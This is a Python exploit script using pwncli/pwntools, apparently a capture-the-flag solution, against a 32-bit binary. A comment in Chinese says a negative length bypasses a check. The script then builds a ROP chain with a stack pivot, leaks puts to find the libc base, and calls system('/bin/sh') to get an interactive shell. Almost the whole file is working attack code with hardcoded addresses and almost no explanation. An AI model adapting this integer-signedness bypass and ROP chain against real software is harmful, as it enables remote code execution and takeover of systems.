#!/usr/bin/python3
from pwncli import *

cli_script()

p:tube = gift['io']
elf:ELF = gift['elf']
libc = gift['libc']
if gift['remote']:
    libc: ELF = ELF('/root/LibcSearcher/libc-database/other_libc/libc-2.27-32bit.so')

"""
输入负数即可绕过校验
之后进行rop
"""
buffer_addr = 0x0804A060
puts_addr = 0x8048490
puts_got_addr = 0x804A01C
main_addr = 0x80486ea

read_addr = 0x8048460

p.sendafter("Now, Challenger, What's name?\n:", "aaaaaa")
p.sendafter("Please set the length of password: ", b"-1\x00\x00"+p32(0x8048793)+p32(buffer_addr)+p32(0xf00))

p.sendlineafter(":", flat("a"*72, 
buffer_addr+8, # ecx
0, #ebx
0, # edi
buffer_addr + 0xf00, # ebp
))

sleep(1)
payload = flat({
    0:[0x080487B3, buffer_addr+0x500, 0, 0, buffer_addr+0xf00],
    0x500-4: [puts_addr, 0x08048431, puts_got_addr, read_addr, 0, 0, buffer_addr, 0xf00]
}, filler="\x00")

p.send(payload)

msg = p.recvuntil("\xf7")

libc_base_addr = u32(msg[-4:]) - libc.sym['puts']
log_libc_base_addr(libc_base_addr)
libc.address = libc_base_addr

sleep(1)

p.send(flat("/bin/sh\x00", cyclic(0x4ec-8), libc.sym['system'], 0, buffer_addr))

p.interactive()
